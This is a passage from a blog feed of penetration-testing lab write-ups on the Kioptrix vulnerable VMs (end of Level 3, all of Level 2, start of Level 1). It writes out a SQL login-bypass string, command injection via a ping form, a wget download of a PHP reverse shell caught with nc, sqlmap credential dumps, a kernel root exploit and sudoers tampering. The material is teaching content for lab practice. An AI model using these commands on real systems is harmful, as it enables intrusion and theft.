</span><span class='line'>-rw-r--r--  1 root root 26430 Jan 21  2007 gnu-lgpl.txt
</span><span class='line'>-rw-r--r--  1 root root   399 Feb 23  2011 index.php
</span><span class='line'>drwxrwxrwx 10 root root  4096 Apr 14  2011 modules
</span><span class='line'>drwxrwxrwx  3 root root  4096 Apr 14  2011 style
</span><span class='line'>-rw-r--r--  1 root root   243 Aug  5  2010 update.php</span></code></pre></td></tr></table></div></figure>


<p>The gallery directory looks interesting, so I looked inside:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cd gallery
</span><span class='line'>ls -l
</span><span class='line'>total 156
</span><span class='line'>drwxr-xr-x 2 root root  4096 Apr 12  2011 BACK
</span><span class='line'>-rw-r--r-- 1 root root  3573 Oct 10  2009 db.sql
</span><span class='line'>-rw-r--r-- 1 root root   252 Apr 12  2011 g.php
</span><span class='line'>drwxr-xr-x 3 root root  4096 Apr 12  2011 gadmin
</span><span class='line'>-rw-r--r-- 1 root root   214 Apr 12  2011 gallery.php
</span><span class='line'>-rw-r--r-- 1 root root  1440 Apr 14  2011 gconfig.php
</span><span class='line'>-rw-r--r-- 1 root root   297 Apr 12  2011 gfooter.php
</span><span class='line'>-rw-r--r-- 1 root root 38771 Apr 12  2011 gfunctions.php
</span><span class='line'>-rw-r--r-- 1 root root  1009 Apr 12  2011 gheader.php
</span><span class='line'>-rw-r--r-- 1 root root   249 Apr 12  2011 index.php
</span><span class='line'>-rw-r--r-- 1 root root 10340 Apr 12  2011 install.BAK
</span><span class='line'>-rw-r--r-- 1 root root   212 Apr 12  2011 login.php
</span><span class='line'>-rw-r--r-- 1 root root   213 Apr 12  2011 logout.php
</span><span class='line'>-rw-r--r-- 1 root root   249 Apr 12  2011 p.php
</span><span class='line'>drwxrwxrwx 2 root root  4096 Apr 12  2011 photos
</span><span class='line'>-rw-r--r-- 1 root root   213 Apr 12  2011 photos.php
</span><span class='line'>-rw-r--r-- 1 root root   219 Apr 12  2011 post_comment.php
</span><span class='line'>-rw-r--r-- 1 root root   214 Apr 12  2011 profile.php
</span><span class='line'>-rw-r--r-- 1 root root    87 Oct 10  2009 readme.html
</span><span class='line'>-rw-r--r-- 1 root root   213 Apr 12  2011 recent.php
</span><span class='line'>-rw-r--r-- 1 root root   215 Apr 12  2011 register.php
</span><span class='line'>drwxr-xr-x 2 root root  4096 Apr 13  2011 scopbin
</span><span class='line'>-rw-r--r-- 1 root root   213 Apr 12  2011 search.php
</span><span class='line'>-rw-r--r-- 1 root root   216 Apr 12  2011 slideshow.php
</span><span class='line'>-rw-r--r-- 1 root root   211 Apr 12  2011 tags.php
</span><span class='line'>drwxr-xr-x 6 root root  4096 Apr 12  2011 themes
</span><span class='line'>-rw-r--r-- 1 root root    56 Oct 10  2009 version.txt
</span><span class='line'>-rw-r--r-- 1 root root   211 Apr 12  2011 vote.php</span></code></pre></td></tr></table></div></figure>


<p>So, there&rsquo;s all the source code for the gallery. I checked the files that looked interesting until I came upon a hit on the <code>gconfig.php</code> file, which contains the sort of information we need:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/*
</span><span class='line'>  A sample Gallarific configuration file. You should edit
</span><span class='line'>  the installer details below and save this file as gconfig.php
</span><span class='line'>  Do not modify anything else if you don't know what it is.
</span><span class='line'>*/
</span><span class='line'>
</span><span class='line'>  $GLOBALS["gallarific_path"] = "http://kioptrix3.com/gallery";
</span><span class='line'>
</span><span class='line'>  $GLOBALS["gallarific_mysql_server"] = "localhost";
</span><span class='line'>  $GLOBALS["gallarific_mysql_database"] = "gallery";
</span><span class='line'>  $GLOBALS["gallarific_mysql_username"] = "root";
</span><span class='line'>  $GLOBALS["gallarific_mysql_password"] = "fuckeyou";</span></code></pre></td></tr></table></div></figure>


<p>I tried SSHing to the box with these credentials and also elevating privileges with su, but that would have been too easy. So more digging in the Php source code. The <code>gfunctions.php</code> file contains a plethora of information, among which there are some table and column names. There might be more information in the Php files but I didn&rsquo;t have the patience to go through all of them.</p>

<p>Back at the gallery, we can see some sorting options:</p>

<p><img class="center" src="http://chousensha.github.io/images/sort.png" title="sort options" alt="sort"></p>

<p>Changing the sort filter to <em>photo id</em> makes the URL look like this:</p>

<p><code><a href="http://kioptrix3.com/gallery/gallery.php?id=1&amp;sort=photoid#photos">http://kioptrix3.com/gallery/gallery.php?id=1&amp;sort=photoid#photos</a></code></p>

<p>And if I replace the <code>id=1</code> part with <code>id=&lsquo;</code>, the site spits back a SQL error:</p>

<p><em>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &lsquo;&rsquo; order by parentid,sort,name&#8217; at line 1Could not select category</em></p>

<p>Now that I know SQLi is possible, it&rsquo;s time to fire sqlmap again!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=photoid#photos" --dbms=MySQL --level=5 --risk=3 --dump
</span><span class='line'>
</span><span class='line'>Database: gallery
</span><span class='line'>Table: dev_accounts
</span><span class='line'>[2 entries]
</span><span class='line'>+----+------------+----------------------------------+
</span><span class='line'>| id | username   | password                         |
</span><span class='line'>+----+------------+----------------------------------+
</span><span class='line'>| 1  | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 |
</span><span class='line'>| 2  | loneferret | 5badcaf789d3d1d09794d8f021f40f0e |
</span><span class='line'>+----+------------+----------------------------------+
</span></code></pre></td></tr></table></div></figure>


<p>It was a bit overkill to dump so much information, but I only show here the important bits. To crack the hashes, I used the <a href="http://www.hashkiller.co.uk/">http://www.hashkiller.co.uk/</a> site:</p>

<p>dreg&rsquo;s password: Mast3r</p>

<p>loneferret&rsquo;s password: starwars</p>

<p>Thankfully, these credentials work for SSH login, so I could get rid of the Metasploit shell which kept throwing EOF errors if I didn&rsquo;t interact with it for a while.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh loneferret@kioptrix3.com
</span><span class='line'>The authenticity of host 'kioptrix3.com (192.168.127.128)' can't be established.
</span><span class='line'>RSA key fingerprint is 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd.
</span><span class='line'>Are you sure you want to continue connecting (yes/no)? yes
</span><span class='line'>Warning: Permanently added 'kioptrix3.com' (RSA) to the list of known hosts.
</span><span class='line'>loneferret@kioptrix3.com's password: 
</span><span class='line'>Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686
</span><span class='line'>
</span><span class='line'>The programs included with the Ubuntu system are free software;
</span><span class='line'>the exact distribution terms for each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
</span><span class='line'>applicable law.
</span><span class='line'>
</span><span class='line'>To access official Ubuntu documentation, please visit:
</span><span class='line'>http://help.ubuntu.com/
</span><span class='line'>Last login: Sat Apr 16 08:51:58 2011 from 192.168.1.106
</span><span class='line'>loneferret@Kioptrix3:~$ </span></code></pre></td></tr></table></div></figure>


<p>In the home directory there&rsquo;s a <code>CompanyPolicy.README</code> file with the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> Hello new employee,
</span><span class='line'> It is company policy here to use our newly installed software for editing, creating and viewing files.
</span><span class='line'> Please use the command 'sudo ht'.
</span><span class='line'> Failure to do so will result in you immediate termination.
</span><span class='line'>
</span><span class='line'> DG
</span><span class='line'> CEO</span></code></pre></td></tr></table></div></figure>


<p>So, let&rsquo;s see what this ht program is all about:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>loneferret@Kioptrix3:~$ whereis ht
</span><span class='line'>ht: /usr/local/bin/ht
</span><span class='line'>loneferret@Kioptrix3:~$ ls -l /usr/local/bin/ht
</span><span class='line'>-rwsr-sr-x 1 root root 2072344 2011-04-16 07:26 /usr/local/bin/ht</span></code></pre></td></tr></table></div></figure>


<p>Looks like a SUID binary! And it seems it&rsquo;s a hex editor that we can use to view and edit any file on the system!</p>

<p><img class="center" src="http://chousensha.github.io/images/ht.png" title="ht" alt="ht"></p>

<p>Ok, I could crack the root password, but there&rsquo;s an easier way, by modifing the <code>/etc/sudoers</code> file. First, I had to look up some information about the ht editor. You need to use the F (function) keys for this one. With F6, I could change the mode to text, making it look less horrible. The easiest way I found to go about it was to open the <code>/etc/sudoers</code> file again, after selecting the text mode. Then I added <em>/bin/bas</em> to loneferret&rsquo;s entry:</p>

<p><img class="center" src="http://chousensha.github.io/images/sudo_bash.png" title="sudo bash" alt="sudo bash"></p>

<p>Now save the file and type <em>sudo bash</em> to get the long waited for root shell. In the /root/ directory there&rsquo;s also a <code>Congrats.txt</code> file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@Kioptrix3:/root# cat Congrats.txt
</span><span class='line'>Good for you for getting here.
</span><span class='line'>Regardless of the matter (staying within the spirit of the game of course)
</span><span class='line'>you got here, congratulations are in order. Wasn't that bad now was it.
</span><span class='line'>
</span><span class='line'>Went in a different direction with this VM. Exploit based challenges are
</span><span class='line'>nice. Helps workout that information gathering part, but sometimes we
</span><span class='line'>need to get our hands dirty in other things as well.
</span><span class='line'>Again, these VMs are beginner and not intented for everyone. 
</span><span class='line'>Difficulty is relative, keep that in mind.
</span><span class='line'>
</span><span class='line'>The object is to learn, do some research and have a little (legal)
</span><span class='line'>fun in the process.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>I hope you enjoyed this third challenge.
</span><span class='line'>
</span><span class='line'>Steven McElrea
</span><span class='line'>aka loneferret
</span><span class='line'>http://www.kioptrix.com
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Credit needs to be given to the creators of the gallery webapp and CMS used
</span><span class='line'>for the building of the Kioptrix VM3 site.
</span><span class='line'>
</span><span class='line'>Main page CMS: 
</span><span class='line'>http://www.lotuscms.org
</span><span class='line'>
</span><span class='line'>Gallery application: 
</span><span class='line'>Gallarific 2.1 - Free Version released October 10, 2009
</span><span class='line'>http://www.gallarific.com
</span><span class='line'>Vulnerable version of this application can be downloaded
</span><span class='line'>from the Exploit-DB website:
</span><span class='line'>http://www.exploit-db.com/exploits/15891/
</span><span class='line'>
</span><span class='line'>The HT Editor can be found here:
</span><span class='line'>http://hte.sourceforge.net/downloads.html
</span><span class='line'>And the vulnerable version on Exploit-DB here:
</span><span class='line'>http://www.exploit-db.com/exploits/17083/
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Also, all pictures were taken from Google Images, so being part of the
</span><span class='line'>public domain I used them.</span></code></pre></td></tr></table></div></figure>


<p>And this was Kioptrix level 3, with another interesting twist.</p>

<blockquote><p>Today is the tomorrow you worried about yesterday.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Kioptrix Level 2]]></title>
    <link href="http://chousensha.github.io/blog/2014/06/16/pentest-lab-kioptrix-level-2/"/>
    <updated>2014-06-16T22:47:31+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/06/16/pentest-lab-kioptrix-level-2</id>
    <content type="html"><![CDATA[<p>Today I will walk through exploiting level 2 in the Kioptrix series.</p>

<!-- more -->


<p>Again, I first did a ping sweep with Nmap and determined the IP of the target is 192.168.127.162</p>

<p>Next, the port scan:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -A -p1-65535 192.168.127.162
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 ( http://nmap.org ) at 2014-06-16 22:52 EEST
</span><span class='line'>Nmap scan report for 192.168.127.162
</span><span class='line'>Host is up (0.00036s latency).
</span><span class='line'>Not shown: 65528 closed ports
</span><span class='line'>PORT     STATE SERVICE  VERSION
</span><span class='line'>22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
</span><span class='line'>|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
</span><span class='line'>|_sshv1: Server supports SSHv1
</span><span class='line'>80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
</span><span class='line'>|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
</span><span class='line'>|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
</span><span class='line'>111/tcp  open  rpcbind  2 (RPC #100000)
</span><span class='line'>| rpcinfo: 
</span><span class='line'>|   program version   port/proto  service
</span><span class='line'>|   100000  2            111/tcp  rpcbind
</span><span class='line'>|   100000  2            111/udp  rpcbind
</span><span class='line'>|   100024  1            630/udp  status
</span><span class='line'>|_  100024  1            633/tcp  status
</span><span class='line'>443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
</span><span class='line'>|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
</span><span class='line'>|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
</span><span class='line'>| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
</span><span class='line'>| Not valid before: 2009-10-07T23:10:47+00:00
</span><span class='line'>|_Not valid after:  2010-10-07T23:10:47+00:00
</span><span class='line'>|_ssl-date: 2014-06-16T16:42:47+00:00; -3h09m46s from local time.
</span><span class='line'>| sslv2: 
</span><span class='line'>|   SSLv2 supported
</span><span class='line'>|   ciphers: 
</span><span class='line'>|     SSL2_DES_192_EDE3_CBC_WITH_MD5
</span><span class='line'>|     SSL2_RC2_CBC_128_CBC_WITH_MD5
</span><span class='line'>|     SSL2_RC4_128_WITH_MD5
</span><span class='line'>|     SSL2_RC4_64_WITH_MD5
</span><span class='line'>|     SSL2_DES_64_CBC_WITH_MD5
</span><span class='line'>|     SSL2_RC2_CBC_128_CBC_WITH_MD5
</span><span class='line'>|_    SSL2_RC4_128_EXPORT40_WITH_MD5
</span><span class='line'>631/tcp  open  ipp      CUPS 1.1
</span><span class='line'>| http-methods: Potentially risky methods: PUT
</span><span class='line'>|_See http://nmap.org/nsedoc/scripts/http-methods.html
</span><span class='line'>|_http-title: 403 Forbidden
</span><span class='line'>633/tcp  open  status   1 (RPC #100024)
</span><span class='line'>| rpcinfo: 
</span><span class='line'>|   program version   port/proto  service
</span><span class='line'>|   100000  2            111/tcp  rpcbind
</span><span class='line'>|   100000  2            111/udp  rpcbind
</span><span class='line'>|   100024  1            630/udp  status
</span><span class='line'>|_  100024  1            633/tcp  status
</span><span class='line'>3306/tcp open  mysql    MySQL (unauthorized)
</span><span class='line'>MAC Address: 00:0C:29:20:9D:3E (VMware)
</span><span class='line'>Device type: general purpose
</span><span class='line'>Running: Linux 2.6.X
</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:2.6
</span><span class='line'>OS details: Linux 2.6.9 - 2.6.30</span></code></pre></td></tr></table></div></figure>


<h3>From web to shell</h3>

<p>Pointing the browser to the target, we can see this remote admin login panel:</p>

<p><img class="center" src="http://chousensha.github.io/images/login.png" title="admin login" alt="login"></p>

<p>Immediately thinking SQL injection, I did a quick scan with Owasp Zap and indeed, the login can be bypassed using an injection like the following:</p>

<p><code>&lsquo; or '1&rsquo; = &lsquo;1&rsquo; &mdash; </code></p>

<p>Now we can see an interface where we can ping hosts, which might mean remote code execution:</p>

<p><img class="center" src="http://chousensha.github.io/images/ping.png" title="ping ip" alt="ping"></p>

<p>After testing the ping functionality, I ran a quick <em>uname -a</em> to confirm that remote code execution is possible:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>; uname -a
</span><span class='line'>
</span><span class='line'>Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 athlon i386 GNU/Linux</span></code></pre></td></tr></table></div></figure>


<p>The semicolon is used to run multiple commands, so in this case I am closing the ping command and inputting another one after it. I tried poking around, checking if I can read /etc/shadow (which I can&rsquo;t, only /etc/passwd). The commands are ran by the <strong>apache</strong> user. So I&rsquo;m thinking, it&rsquo;s time for some PHP backdoor fun! I found some on Kali in <code>/usr/share/webshells/php</code></p>

<p>First, I&rsquo;m going to copy the reverse PHP shell to my home directory and rename it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cp php-reverse-shell.php ~/shell.php</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s see the description:</p>

<blockquote><p>This script will make an outbound TCP connection to a hardcoded IP and port.
The recipient will be given a shell running as the current user (apache normally).</p></blockquote>

<p>Next I looked at the Php code, and I need to change the IP and port. The IP is the address of the attacker machine, and for the port I just threw 80 in there, since an outbound connection to port 80 is guaranteed to be allowed (if there was a firewall in place).</p>

<p>With that done, the next step is to serve the shell on my machine and use the web interface to download it to the target host.</p>

<p>On my machine:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -v -l -p 80 &lt; shell.php</span></code></pre></td></tr></table></div></figure>


<p>On the web interface:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>; wget 192.168.127.159:80 -O /tmp/puppies.php 
</span><span class='line'>
</span><span class='line'>; ls /tmp
</span><span class='line'>
</span><span class='line'>puppies.php</span></code></pre></td></tr></table></div></figure>


<p>Now listen on my machine for the incoming connection:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -v -l -p 80 </span></code></pre></td></tr></table></div></figure>


<p>And on the web interface, execute the shell:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>; php /tmp/puppies.php</span></code></pre></td></tr></table></div></figure>


<p>And we have a shell!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc: connect to 192.168.127.159 80 from 192.168.127.162 (192.168.127.162) 32772 [32772]
</span><span class='line'>Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 athlon i386 GNU/Linux
</span><span class='line'> 13:15:37 up  2:21,  0 users,  load average: 0.00, 0.00, 0.00
</span><span class='line'>USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
</span><span class='line'>uid=48(apache) gid=48(apache) groups=48(apache)
</span><span class='line'>sh: no job control in this shell</span></code></pre></td></tr></table></div></figure>


<p>It&rsquo;s time for privilege escalation! I will use the sendpage exploit:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cp /usr/share/exploitdb/platforms/linux/local/9545.c ~/sendpage.c
</span><span class='line'>nc -vv -l -p 5555 &lt; sendpage.c</span></code></pre></td></tr></table></div></figure>


<p>And from the shell:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-3.00# wget 192.168.127.159 -O /tmp/sendpage.c
</span><span class='line'>sh-3.00# cd /tmp
</span><span class='line'>sh-3.00# gcc -o sendpage sendpage.c
</span><span class='line'>sh-3.00# chmod a+x sendpage
</span><span class='line'>sh-3.00# ./sendpage
</span><span class='line'>sh: no job control in this shell
</span><span class='line'>sh-3.00# whoami
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<h3>Breaking into the database</h3>

<p>I will now explore a different attack vector, by using <strong>sqlmap</strong> to dump the juicy stuff of the database.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u "http://192.168.127.162/index.php" --dbms=MySQL --dump --data "uname=test&psw=pass" --level=5 --risk=3
</span><span class='line'>Database: webapp
</span><span class='line'>Table: users
</span><span class='line'>[2 entries]
</span><span class='line'>+----+----------+------------+
</span><span class='line'>| id | username | password   |
</span><span class='line'>+----+----------+------------+
</span><span class='line'>| 1  | admin    | 5afac8d85f |
</span><span class='line'>| 2  | john     | 66lajGGbla |
</span><span class='line'>+----+----------+------------+</span></code></pre></td></tr></table></div></figure>


<p>I couldn&rsquo;t connect to the MySQL database though, so didn&rsquo;t find a use for these credentials.</p>

<p>I also tried an exploit against the CUPS daemon, to no avail. So I guess this is it for level 2.</p>

<blockquote><p>You have an unusual magnetic personality.  Don&rsquo;t walk too close to
metal objects which are not fastened down.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Kioptrix Level 1]]></title>
    <link href="http://chousensha.github.io/blog/2014/06/12/pentest-lab-kioptrix-level-1/"/>
    <updated>2014-06-12T22:45:37+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/06/12/pentest-lab-kioptrix-level-1</id>
    <content type="html"><![CDATA[<p>For today&rsquo;s pentest lab, I will use the Kioptrix Level 1 virtual machine as the target. Kioptrix Level 1 is the first in a series of vulnerable machines for beginner penetration testing practice.</p>

<!-- more -->


<p>First, to get its IP address, I had to ping sweep the subnet with the following command:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sP 192.168.127.0/24</span></code></pre></td></tr></table></div></figure>


<p>By correlating the MAC address information from the scan with that from VMware, I now know the IP for the machine is 192.168.127.153.</p>

<p>Now, port scan the target:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
